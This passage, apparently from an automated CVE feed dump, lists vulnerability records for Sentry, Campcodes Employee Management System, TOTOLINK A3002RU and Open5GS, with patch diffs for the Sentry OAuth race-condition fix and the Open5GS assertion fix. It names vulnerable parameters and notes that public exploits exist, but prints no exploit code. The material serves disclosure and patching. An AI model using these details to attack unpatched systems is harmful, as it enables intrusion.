  2. https://vuldb.com/?ctiid.314494 [Permissions Required]
  3. https://vuldb.com/?id.314494 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605896 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314494 ---
mailuid

================================================================================


CVE ID: CVE-2025-53099
Published: 2025-07-01T15:15:26.277
Modified: 2025-09-15T18:03:33.857
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-288: CWE-288

Description:
Sentry is a developer-first error tracking and performance monitoring tool. Prior to version 25.5.0, an attacker with a malicious OAuth application registered with Sentry can take advantage of a race condition and improper handling of authorization code within Sentry to maintain persistence to a user's account. With a specially timed requests and redirect flows, an attacker could generate multiple authorization codes that could be used to exchange for access and refresh tokens. This was possible even after de-authorizing the particular application. This issue has been patched in version 25.5.0. Self-hosted Sentry users should upgrade to version 25.5.0 or higher. Sentry SaaS users do not need to take any action.

References (8):
  1. https://github.com/getsentry/sentry/commit/57f0129e1e977b76fe8d16667a586578791a3dcd [Patch]
  2. https://github.com/getsentry/sentry/commit/ab5fd932ca6bd46529ba3308b4669e3cee719b8f [Patch]
  3. https://github.com/getsentry/sentry/commit/e6241254aead969e6c8490a81cde9a01335df19d [Patch]
  4. https://github.com/getsentry/sentry/pull/85570 [Issue Tracking, Patch]
  5. https://github.com/getsentry/sentry/pull/85571 [Issue Tracking, Patch]
  6. https://github.com/getsentry/sentry/pull/86069 [Issue Tracking]
  7. https://github.com/getsentry/sentry/pull/86532 [Issue Tracking]
  8. https://github.com/getsentry/sentry/security/advisories/GHSA-mgh8-h4xc-pfmj [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/getsentry/sentry/commit/57f0129e1e977b76fe8d16667a586578791a3dcd ---
From 57f0129e1e977b76fe8d16667a586578791a3dcd Mon Sep 17 00:00:00 2001
From: Matthew T <20070360+mdtro@users.noreply.github.com>
Date: Tue, 29 Apr 2025 16:00:17 -0500
Subject: [PATCH] fix(oauth): add locking to prevent race conditions in grant
 exchange (#85570)

Pulled from #82052 to break out these changes into smaller PRs.

Use locks to ensure an `ApiGrant` cannot be used twice during a race
condition that would result in multiple access/refresh token pairs.
---
 src/sentry/models/apigrant.py                 | 12 ++++++
 src/sentry/models/apitoken.py                 | 42 +++++++++++++------
 .../token_exchange/grant_exchanger.py         | 21 +++++++---
 src/sentry/web/frontend/oauth_token.py        | 13 +++++-
 .../token_exchange/test_grant_exchanger.py    | 16 +++++++
 tests/sentry/web/frontend/test_oauth_token.py | 23 ++++++++++
 6 files changed, 108 insertions(+), 19 deletions(-)

diff --git a/src/sentry/models/apigrant.py b/src/sentry/models/apigrant.py
index d511a611aee4fb..3d7cf302c67840 100644
--- a/src/sentry/models/apigrant.py
+++ b/src/sentry/models/apigrant.py
@@ -15,6 +15,14 @@
 DEFAULT_EXPIRATION = timedelta(minutes=10)
 
 
+class InvalidGrantError(Exception):
+    pass
+
+
+class ExpiredGrantError(Exception):
+    pass
+
+
 def default_expiration():
     return timezone.now() + DEFAULT_EXPIRATION
 
@@ -97,6 +105,10 @@ def is_expired(self):
     def redirect_uri_allowed(self, uri):
         return uri == self.redirect_uri
 
+    @classmethod
+    def get_lock_key(cls, grant_id):
+        return f"api_grant:{grant_id}"
+
     @classmethod
     def sanitize_relocation_json(
         cls, json: Any, sanitizer: Sanitizer, model_name: NormalizedModelName | None = None
diff --git a/src/sentry/models/apitoken.py b/src/sentry/models/apitoken.py
index ba76dfb0662d95..85573b48924276 100644
--- a/src/sentry/models/apitoken.py
+++ b/src/sentry/models/apitoken.py
@@ -19,7 +19,9 @@
 from sentry.db.models.fields.hybrid_cloud_foreign_key import HybridCloudForeignKey
 from sentry.hybridcloud.outbox.base import ControlOutboxProducingManager, ReplicatedControlModel
 from sentry.hybridcloud.outbox.category import OutboxCategory
-from sentry.models.apigrant import ApiGrant
+from sentry.locks import locks
+from sentry.models.apiapplication import ApiApplicationStatus
+from sentry.models.apigrant import ApiGrant, ExpiredGrantError, InvalidGrantError
 from sentry.models.apiscopes import HasApiScopes
 from sentry.types.region import find_all_region_names
 from sentry.types.token import AuthTokenType
@@ -276,17 +278,33 @@ def handle_async_deletion(
 
     @classmethod
     def from_grant(cls, grant: ApiGrant):
-        with transaction.atomic(router.db_for_write(cls)):
-            api_token = cls.objects.create(
-                application=grant.application,
-                user=grant.user,
-                scope_list=grant.get_scopes(),
-                scoping_organization_id=grant.organization_id,
-            )
-
-            # remove the ApiGrant from the database to prevent reuse of the same
-            # authorization code
-            grant.delete()
+        if grant.application.status != ApiApplicationStatus.active:
+            raise InvalidGrantError()
+
+        if grant.is_expired():
+            raise ExpiredGrantError()
+
+        lock = locks.get(
+            ApiGrant.get_lock_key(grant.id),
+            duration=10,
+            name="api_grant",
+        )
+
+        # we use a lock to prevent race conditions when creating the ApiToken
+        # an attacker could send two requests to create an access/refresh token pair
+        # at the same time, using the same grant, and get two different tokens
+        with lock.acquire():
+            with transaction.atomic(router.db_for_write(cls)):
+                api_token = cls.objects.create(
+                    application=grant.application,
+                    user=grant.user,
+                    scope_list=grant.get_scopes(),
+                    scoping_organization_id=grant.organization_id,
+                )
+
+                # remove the ApiGrant from the database to prevent reuse of the same
+                # authorization code
+                grant.delete()
 
             return api_token
 
diff --git a/src/sentry/sentry_apps/token_exchange/grant_exchanger.py b/src/sentry/sentry_apps/token_exchange/grant_exchanger.py
index 926b9774c4d935..647589e029ebe9 100644
--- a/src/sentry/sentry_apps/token_exchange/grant_exchanger.py
+++ b/src/sentry/sentry_apps/token_exchange/grant_exchanger.py
@@ -6,6 +6,7 @@
 from django.utils.functional import cached_property
 
 from sentry import analytics
+from sentry.locks import locks
 from sentry.models.apiapplication import ApiApplication
 from sentry.models.apigrant import ApiGrant
 from sentry.models.apitoken import ApiToken
@@ -35,12 +36,22 @@ class GrantExchanger:
     def run(self):
         with transaction.atomic(using=router.db_for_write(ApiToken)):
             try:
-                self._validate()
-                token = self._create_token()
+                lock = locks.get(
+                    ApiGrant.get_lock_key(self.grant.id),
+                    duration=10,
+                    name="api_grant",
+                )
+
+                # we use a lock to prevent race conditions when creating the ApiToken
+                # an attacker could send two requests to create an access/refresh token pair
+                # at the same time, using the same grant, and get two different tokens
+                with lock.acquire():
+                    self._validate()
+                    token = self._create_token()
 
-                # Once it's exchanged it's no longer valid and should not be
-                # exchangeable, so we delete it.
-                self._delete_grant()
+                    # Once it's exchanged it's no longer valid and should not be
+                    # exchangeable, so we delete it.
+                    self._delete_grant()
             except SentryAppIntegratorError:
                 logger.info(
                     "grant-exchanger.context",
diff --git a/src/sentry/web/frontend/oauth_token.py b/src/sentry/web/frontend/oauth_token.py
index e4f52342a288f2..8f61ed10ae9d88 100644
--- a/src/sentry/web/frontend/oauth_token.py
+++ b/src/sentry/web/frontend/oauth_token.py
@@ -18,6 +18,7 @@
 from sentry.models.apitoken import ApiToken
 from sentry.sentry_apps.token_exchange.util import GrantTypes
 from sentry.utils import json, metrics
+from sentry.utils.locking import UnableToAcquireLock
 from sentry.web.frontend.base import control_silo_view
 from sentry.web.frontend.openidtoken import OpenIDToken
 
@@ -128,7 +129,9 @@ def post(self, request: Request) -> HttpResponse:
     def get_access_tokens(self, request: Request, application: ApiApplication) -> dict:
         code = request.POST.get("code")
         try:
-            grant = ApiGrant.objects.get(application=application, code=code)
+            grant = ApiGrant.objects.get(
+                application=application, application__status=ApiApplicationStatus.active, code=code
+            )
         except ApiGrant.DoesNotExist:
             return {"error": "invalid_grant", "reason": "invalid grant"}
 
@@ -141,7 +144,12 @@ def get_access_tokens(self, request: Request, application: ApiApplication) -> di
         elif grant.redirect_uri != redirect_uri:
             return {"error": "invalid_grant", "reason": "invalid redirect URI"}
 
-        token_data = {"token": ApiToken.from_grant(grant=grant)}
+        try:
+            token_data = {"token": ApiToken.from_grant(grant=grant)}
+        except UnableToAcquireLock:
+            # TODO(mdtro): we should return a 409 status code here
+            return {"error": "invalid_grant", "reason": "invalid grant"}
+
         if grant.has_scope("openid") and options.get("codecov.signing_secret"):
             open_id_token = OpenIDToken(
                 request.POST.get("client_id"),
@@ -150,6 +158,7 @@ def get_access_tokens(self, request: Request, application: ApiApplication) -> di
                 nonce=request.POST.get("nonce"),
             )
             token_data["id_token"] = open_id_token.get_signed_id_token(grant=grant)
+
         return token_data
 
     def get_refresh_token(self, request: Request, application: ApiApplication) -> dict:
diff --git a/tests/sentry/sentry_apps/token_exchange/test_grant_exchanger.py b/tests/sentry/sentry_apps/token_exchange/test_grant_exchanger.py
index b1f97026b6cb69..9137b3bf5e8c15 100644
--- a/tests/sentry/sentry_apps/token_exchange/test_grant_exchanger.py
+++ b/tests/sentry/sentry_apps/token_exchange/test_grant_exchanger.py
@@ -104,6 +104,22 @@ def test_deletes_grant_on_successful_exchange(self):
         self.grant_exchanger.run()
         assert not ApiGrant.objects.filter(id=grant_id)
 
+    def test_race_condition_on_grant_exchange(self):
+        from sentry.locks import locks
+        from sentry.utils.locking import UnableToAcquireLock
+
+        # simulate a race condition on the grant exchange
+        grant_id = self.orm_install.api_grant_id
+        lock = locks.get(
+            ApiGrant.get_lock_key(grant_id),
+            duration=10,
+            name="api_grant",
+        )
+        lock.acquire()
+
+        with pytest.raises(UnableToAcquireLock):
+            self.grant_exchanger.run()
+
     @patch("sentry.analytics.record")
     def test_records_analytics(self, record):
         GrantExchanger(
diff --git a/tests/sentry/web/frontend/test_oauth_token.py b/tests/sentry/web/frontend/test_oauth_token.py
index 6ad5f18c86418c..b6990d4f5a599a 100644
--- a/tests/sentry/web/frontend/test_oauth_token.py
+++ b/tests/sentry/web/frontend/test_oauth_token.py
@@ -2,6 +2,7 @@
 
 from django.utils import timezone
 
+from sentry.locks import locks
 from sentry.models.apiapplication import ApiApplication
 from sentry.models.apigrant import ApiGrant
 from sentry.models.apitoken import ApiToken
@@ -203,6 +204,28 @@ def test_one_time_use_grant(self):
         )
         assert resp.status_code == 400
 
+    def test_grant_lock(self):
+        self.login_as(self.user)
+
+        # Simulate a concurrent request by using an existing grant
+        # that has its grant lock taken out.
+        lock = locks.get(ApiGrant.get_lock_key(self.grant.id), duration=10, name="api_grant")
+        lock.acquire()
+
+        # Attempt to create a token with the same grant
+        # This should fail because the lock is held by the previous request
+        resp = self.client.post(
+            self.path,
+            {
+                "grant_type": "authorization_code",
+                "code": self.grant.code,
+                "client_id": self.application.client_id,
+                "client_secret": self.client_secret,
+            },
+        )
+        assert resp.status_code == 400
+        assert resp.json() == {"error": "invalid_grant"}
+
     def test_invalid_redirect_uri(self):
         self.login_as(self.user)
 


================================================================================


CVE ID: CVE-2025-6956
Published: 2025-07-01T14:15:44.000
Modified: 2025-07-07T14:39:16.537
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Employee Management System 1.0. It has been classified as critical. This affects an unknown part of the file /changepassemp.php. The manipulation of the argument ID leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/34 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314493 [Permissions Required]
  3. https://vuldb.com/?id.314493 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605895 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314493 ---
id

================================================================================


CVE ID: CVE-2025-6955
Published: 2025-07-01T14:15:43.797
Modified: 2025-07-07T14:38:56.467
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Employee Management System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /process/aprocess.php. The manipulation of the argument mailuid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/33 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314492 [Permissions Required]
  3. https://vuldb.com/?id.314492 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605894 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314492 ---
mailuid

================================================================================


CVE ID: CVE-2025-6954
Published: 2025-07-01T14:15:43.580
Modified: 2025-07-07T14:38:45.247
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in Campcodes Employee Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /applyleave.php. The manipulation of the argument ID leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/32 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314491 [Permissions Required]
  3. https://vuldb.com/?id.314491 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605892 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314491 ---
id

================================================================================


CVE ID: CVE-2025-6953
Published: 2025-07-01T14:15:43.353
Modified: 2025-07-07T14:38:29.763
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability, which was classified as critical, was found in TOTOLINK A3002RU 3.0.0-B20230809.1615. Affected is an unknown function of the file /boafrm/formParentControl of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/d2pq/cve/blob/main/616/26.md [Exploit, Third Party Advisory]
  2. https://github.com/d2pq/cve/blob/main/616/26.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314490 [Permissions Required]
  4. https://vuldb.com/?id.314490 [VDB Entry]
  5. https://vuldb.com/?submit.605874 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314490 ---
submit-url

================================================================================


CVE ID: CVE-2025-6952
Published: 2025-07-01T12:15:24.343
Modified: 2025-08-25T16:50:38.493
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-617: CWE-617

Description:
A vulnerability, which was classified as problematic, has been found in Open5GS up to 2.7.5. This issue affects the function amf_state_operational of the file src/amf/amf-sm.c of the component AMF Service. The manipulation leads to reachable assertion. It is possible to launch the attack on the local host. The identifier of the patch is 53e9e059ed96b940f7ddcd9a2b68cb512524d5db. It is recommended to apply a patch to fix this issue.

References (6):
  1. https://github.com/open5gs/open5gs/commit/53e9e059ed96b940f7ddcd9a2b68cb512524d5db [Patch]
  2. https://github.com/open5gs/open5gs/issues/3938 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://github.com/open5gs/open5gs/issues/3938#issuecomment-3012139813 [Issue Tracking]
  4. https://vuldb.com/?ctiid.314489 [Permissions Required, VDB Entry]
  5. https://vuldb.com/?id.314489 [Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.605312 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://github.com/open5gs/open5gs/commit/53e9e059ed96b940f7ddcd9a2b68cb512524d5db ---
From 53e9e059ed96b940f7ddcd9a2b68cb512524d5db Mon Sep 17 00:00:00 2001
From: Sukchan Lee <acetcom@gmail.com>
Date: Fri, 27 Jun 2025 17:12:49 +0900
Subject: [PATCH] [NFM] Prevent dispatch of SBI events to NF instance FSMs
 finalized by SIGTERM (#3938)

In state_operational, guard against dispatching to NF instance FSMs whose
state has been reset to zero by ogs_fsm_fini() in event_termination(). Drop any
incoming SBI events for those instances and log an error, preventing assertion
failures when late HTTP callbacks arrive after an asynchronous SIGTERM shutdown.
---
 src/amf/amf-sm.c   | 29 ++++++++++++++++++++++++++---
 src/ausf/ausf-sm.c | 29 ++++++++++++++++++++++++++---
 src/bsf/bsf-sm.c   | 29 ++++++++++++++++++++++++++---
 src/nssf/nssf-sm.c | 29 ++++++++++++++++++++++++++---
 src/pcf/pcf-sm.c   | 29 ++++++++++++++++++++++++++---
 src/scp/scp-sm.c   | 29 ++++++++++++++++++++++++++---
 src/sepp/sepp-sm.c | 29 +++++++++++++++++++++++++----
 src/smf/smf-sm.c   | 29 ++++++++++++++++++++++++++---
 src/udm/udm-sm.c   | 29 ++++++++++++++++++++++++++---
 src/udr/udr-sm.c   | 29 ++++++++++++++++++++++++++---
 10 files changed, 259 insertions(+), 31 deletions(-)

diff --git a/src/amf/amf-sm.c b/src/amf/amf-sm.c
index 8e2f5d6737..5d21194478 100644
--- a/src/amf/amf-sm.c
+++ b/src/amf/amf-sm.c
@@ -332,10 +332,33 @@ void amf_state_operational(ogs_fsm_t *s, amf_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &sbi_message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &sbi_message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/ausf/ausf-sm.c b/src/ausf/ausf-sm.c
index 72e7c07d88..f1c8b9d728 100644
--- a/src/ausf/ausf-sm.c
+++ b/src/ausf/ausf-sm.c
@@ -215,10 +215,33 @@ void ausf_state_operational(ogs_fsm_t *s, ausf_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/bsf/bsf-sm.c b/src/bsf/bsf-sm.c
index f0ea09005a..ab233b088d 100644
--- a/src/bsf/bsf-sm.c
+++ b/src/bsf/bsf-sm.c
@@ -234,10 +234,33 @@ void bsf_state_operational(ogs_fsm_t *s, bsf_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/nssf/nssf-sm.c b/src/nssf/nssf-sm.c
index 47f7b3a3f4..77edf26f87 100644
--- a/src/nssf/nssf-sm.c
+++ b/src/nssf/nssf-sm.c
@@ -205,10 +205,33 @@ void nssf_state_operational(ogs_fsm_t *s, nssf_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/pcf/pcf-sm.c b/src/pcf/pcf-sm.c
index 7226d500f5..7260ad2e81 100644
--- a/src/pcf/pcf-sm.c
+++ b/src/pcf/pcf-sm.c
@@ -381,10 +381,33 @@ void pcf_state_operational(ogs_fsm_t *s, pcf_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/scp/scp-sm.c b/src/scp/scp-sm.c
index b77950a503..6cf3ca0df4 100644
--- a/src/scp/scp-sm.c
+++ b/src/scp/scp-sm.c
@@ -167,10 +167,33 @@ void scp_state_operational(ogs_fsm_t *s, scp_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/sepp/sepp-sm.c b/src/sepp/sepp-sm.c
index e8d64ff82b..c1bf955575 100644
--- a/src/sepp/sepp-sm.c
+++ b/src/sepp/sepp-sm.c
@@ -241,11 +241,32 @@ void sepp_state_operational(ogs_fsm_t *s, sepp_event_t *e)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
 
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
                 old_state = OGS_FSM_STATE(&nf_instance->sm);
-                ogs_assert(old_state);
-
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+                if (old_state) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
 
             /*
              * The SEPP on the H-PLMN should send a n32c-handshake message
